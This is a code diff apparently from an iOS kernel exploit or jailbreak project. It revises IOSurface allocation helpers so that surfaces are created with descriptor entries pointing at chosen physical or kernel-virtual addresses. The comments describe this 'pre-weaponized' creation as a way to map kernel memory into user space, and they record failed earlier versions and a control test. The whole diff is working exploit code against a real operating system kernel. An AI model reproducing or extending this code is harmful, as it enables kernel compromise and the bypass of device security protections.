@@ -177,7 +177,13 @@ static int pa_in_hole(uint64_t pa)
 
 uint64_t IOSurface_kalloc_16up(uint64_t size, bool leak); // fwd: defined below
 static mach_port_t IOSurface_kalloc_getSurfacePort_16up(uint64_t size); // v94 fwd: defined below
-static mach_port_t IOSurface_kalloc_getSurfacePort_16up_mode(uint64_t size, int mode); // v97 fwd
+// v105: per-window weaponization state (set by kmap before create).
+static uint64_t g_v105_pa = 0;     // carve-out window base PA
+static unsigned g_v105_seq = 0;    // window sequence (format ladder)
+
+static mach_port_t IOSurface_kalloc_getSurfacePort_16up_mode(uint64_t size, int mode,
+                                                             uint64_t weaponPA,
+                                                             unsigned weaponSeq); // v105 fwd
 
 struct IOSurface_toCleanup *cleanups = NULL;
 unsigned cleanupsCount = 0;
@@ -220,8 +226,11 @@ int IOSurface_map_withCacheMode(uint64_t pa, uint64_t size, void **uaddr, uint32
 	// Zero PT writes. One hypothesis per launch (v94b fallback: client
 	// walk via the sr0/sr8/sr30 dump).
 	(void)cacheMode;
-	// v98: create 64KB-backed legacy surfaces (4 backing pages = 4 slots
-	// in the kernel's packed page list, one per probe-scan page).
+	// v105: pre-weaponized creation — set the ladder state BEFORE the
+	// create call reads it. seq%2: even = PA-formed entries, odd = VA.
+	g_v105_pa = pa;
+	g_v105_seq = seq;
+	jb_tr_beacon("KMAP v105,seq=%u,fmt=%s", seq, (seq & 1) ? "VA" : "PA");
 	mach_port_t surfaceMachPort = IOSurface_kalloc_getSurfacePort_16up(0x10000);
 	if (!surfaceMachPort) {
 		jb_tr_beacon("KMAP fail,noport");
@@ -515,10 +524,23 @@ static CFNumberRef CFNUM64(uint64_t value) {
 }
 
 static mach_port_t IOSurface_kalloc_getSurfacePort_16up(uint64_t size) {
-	// v98: create with a 64KB backing so the packed page list has 4 slots
-	// to retarget (one per probe-scan page); the wire maps ALL of them.
-	if (size <= 0x4000) size = 0x10000;
-	return IOSurface_kalloc_getSurfacePort_16up_mode(size, 0);
+	// v105: PRE-WEAPONIZED CREATION (v104 verdict: 25 correctly-encoded
+	// post-create rewrites across v102+v104 never served non-zero content;
+	// wt,pre identical every window ⇒ the re-wire REBUILDS the table from
+	// the descriptor — the d90.q2 table is a mirror. The only thing the
+	// wire provably consumes is the CREATE dictionary list — v97's A5
+	// page was named THERE). So: name the carve-out IN the dictionary.
+	// seq%2 ladder on the entry format:
+	//   even windows: entries = carve-out PA values (PA-formed)
+	//   odd  windows: entries = kernel-VA values  (VA-formed)
+	// No post-create edits, no table racing — the descriptor is born
+	// weaponized. A5 positive control stays (mode 2 semantics) via the
+	// every-3rd-window override below.
+	static int a5Toggle = 0;
+	int mode = 0;
+	if ((++a5Toggle % 3) == 0) mode = 2;   // A5 control every 3rd window
+	return IOSurface_kalloc_getSurfacePort_16up_mode(size, 0, mode,
+	                                                 g_v105_pa, g_v105_seq);
 }
 
 // v97: mode ladder — the wire's source-of-truth experiment.
@@ -529,7 +551,9 @@ static mach_port_t IOSurface_kalloc_getSurfacePort_16up(uint64_t size) {
 //   mode 2: A5 CONTROL (legacy keys) + a second A5-filled user page as
 //           entry target — if the wire reads the list AT ALL (any time),
 //           C,first = 0xA5A5A5A5A5A5A5A5. Unambiguous positive control.
-static mach_port_t IOSurface_kalloc_getSurfacePort_16up_mode(uint64_t size, int mode) {
+static mach_port_t IOSurface_kalloc_getSurfacePort_16up_mode(uint64_t size, int mode,
+                                                             uint64_t weaponPA,
+                                                             unsigned weaponSeq) {
 	uint64_t rangesAlignedSize = ((size + 0xf) & ~0xf);
 
 	static vm_size_t dummyPageSize = 0x4000;
@@ -544,10 +568,22 @@ static mach_port_t IOSurface_kalloc_getSurfacePort_16up_mode(uint64_t size, int 
 	}
 
 	uint64_t *userspaceRanges = malloc(rangesAlignedSize);
-	uint64_t entryTarget = (mode == 2 && a5Page) ? a5Page : dummyPage;
+	// v105 ENTRY LADDER (overrides the A5 control when weaponSeq%2 set):
+	//   even weaponSeq: entries = carve-out PA values (PA-formed)
+	//   odd  weaponSeq: entries = kernel-VA of the carve-out pages
+	// 4 entries × 0x4000 = the full 0x10000 probe scan.
+	int entryMode = (mode == 2) ? -1 : (int)(weaponSeq & 1);
+	uint64_t entryBase = (entryMode == 1)
+	    ? phystokv(kvtophys(weaponPA & ~0x3FFFULL)) : (weaponPA & ~0x3FFFULL);
 	for (int i = 0; i < (rangesAlignedSize / sizeof(uint64_t)); i += 2) {
-		userspaceRanges[i] = entryTarget;
-		userspaceRanges[i+1] = dummyPageSize;
+		if (entryMode >= 0 && (i / 2) < 4) {
+			userspaceRanges[i]   = entryBase + (uint64_t)(i / 2) * 0x4000ULL;
+			userspaceRanges[i+1] = 0x4000ULL;
+		} else {
+			uint64_t t = (mode == 2 && a5Page) ? a5Page : dummyPage;
+			userspaceRanges[i]   = t;
+			userspaceRanges[i+1] = dummyPageSize;
+		}
 	}
 
     CFDataRef userspaceRangesData = CFDataCreate(kCFAllocatorDefault, (const UInt8 *)userspaceRanges, rangesAlignedSize);
